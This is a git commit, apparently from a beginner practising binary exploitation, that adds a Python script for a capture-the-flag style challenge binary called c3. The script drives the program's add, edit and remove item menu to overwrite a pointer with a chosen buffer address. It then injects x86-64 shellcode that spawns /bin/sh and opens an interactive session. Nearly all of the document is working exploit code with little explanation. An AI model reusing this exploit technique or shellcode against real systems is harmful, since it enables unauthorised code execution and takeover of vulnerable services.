046b373c4f4f4263f3b2590e26f798c6081f6c45
driedfish <lizihaosan@icloud.com>
2016-08-06 16:33:06 +0800

    My first pwn!!
    study to pwn - 1 st

---
+++ Pwn/pwn c3 2016-08-06/minec3.py
@@ -0,0 +1,53 @@
+import time
+from zio import *
+
+def list_item(io):
+    io.read_until('Quit\n')
+    io.writeline('1')
+
+def add_item(io, name, addr):
+    io.read_until('Quit\n')
+    io.writeline('2')
+    io.read_until(':')
+    io.writeline(name)
+    io.read_until(':')
+    io.writeline(addr)
+
+def edit_item(io, index, name, addr):
+    io.read_until('Quit\n')
+    io.writeline('3')
+    io.read_until(':')
+    io.writeline(str(index))
+    io.read_until(':')
+    io.writeline(name)
+    io.read_until(':')
+    io.writeline(addr)
+
+def remove_item(io, index):
+    io.read_until('Quit\n')
+    io.writeline('4')
+    io.read_until(':')
+    io.writeline(str(index))
+
+def exp(target):
+    io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
+    add_item(io, '123', '111')
+    add_item(io, '124', '112')
+
+    buf_addr = 0x6016c0 # point to the address of buffer
+    edit_item(io, 1, '222', '2'*0x10 + '3'*0x10 + '\xc2\x16\x60')
+
+    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+    io.read_until('Quit\n')
+    io.writeline('4')
+    io.read_until(':')
+    io.writeline('2\x00' + shellcode)
+    io.interact()
+
+def main():
+    #target = ('127.0.0.1', 10000)
+    target = './c3'
+    exp(target)
+
+if __name__ == '__main__':
+    main()
